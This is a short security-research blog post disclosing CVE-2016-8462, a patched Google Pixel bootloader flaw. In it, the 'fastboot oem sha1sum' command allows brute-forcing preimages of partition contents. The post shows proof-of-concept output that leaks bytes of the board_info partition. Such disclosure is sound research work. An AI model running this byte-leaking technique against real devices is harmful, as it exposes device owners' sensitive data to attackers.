---
layout: post
title: fastboot oem sha1sum
author: Roee Hay
date: '2017-01-04'
tags:

---

In the [January 2017 Android Security Bulletin](https://source.android.com/security/bulletin/2017-01-01.html#id-in-bootloader), Google provided a patch to CVE-2016-8462, an interesting vulnerabiltiy in the Pixels' bootloader. I reported this issue to Google last December, but unfortunately got beat by Jon Sawyer ([@jcase](https://twitter.com/jcase)) and Sean Beaupre ([@firewaterdevs](https://twitter.com/firewaterdevs)), who reported it in October, so kudos to them!


Google Pixel's bootloader contains a proprietary fastboot oem command ('sha1sum'). This command accepts 3
arguments: partition name, size and offset, with the constraint that size >= offset. Thus, a physical attacker, a
malicious charger or a malicious host (with ADB access -- that can reboot the device to the bootloader) can easily
compute the preimage of the first bytes of any partition. This may allow the attacker to leak sensitive information
out of the device. In addition to the first bytes, one can conduct a preimage attack of higher offsets if a specific
pattern is (approximately) known , such as a known suffix or a prefix. 
What you can see below is the output of two
runs of our PoC against the board_info partition. The first run leaks bytes 0-7 ("HTC-BOAR") and the second run
leaks bytes 158-161 ("\xA2\x80\x00\x00")

{% highlight C %}


>> preimage.py board_info
> fastboot oem sha1sum board_info 0 1 = 7cf184f4c67ad58283ecb19349720b0cae756829 (1 byte )
00000000 : 48 H
> fastboot oem sha1sum board_info 1 1 = c2c53d66948214258a26ca9ca845d7ac0c17f8e7 (1 byte )
00000001 : 54 T
> fastboot oem sha1sum board_info 2 2 = f1dfdb58024fd801bb8d8d91b16183f255579149 (2 bytes )
00000002 : 43 C
00000003 : 2d -
> fastboot oem sha1sum board_info 3 3 = 16ad0e2f78e56b3d6dc93bd203e12b8118605de5 (3 bytes )
00000004 : 42 B
00000005 : 4f O
> fastboot oem sha1sum board_info 4 4 = 7e426c6d5f7b5ce99624a8e678a79828180bcd77 (4 bytes )
00000006 : 41 A
00000007 : 52 R
>> preimage.py board_info 4 158
> fastboot oem sha1sum board_info 158 158 = 45b1b0a4fe2bbefb1f7eb001b57bcb61a1d025b9 (158 bytes )
0000009e : a2 
0000009f : 80
000000a0 : 00
000000a1 : 00

{% endhighlight %}

Google's patch now prevents running the command on an arbitrary partition.

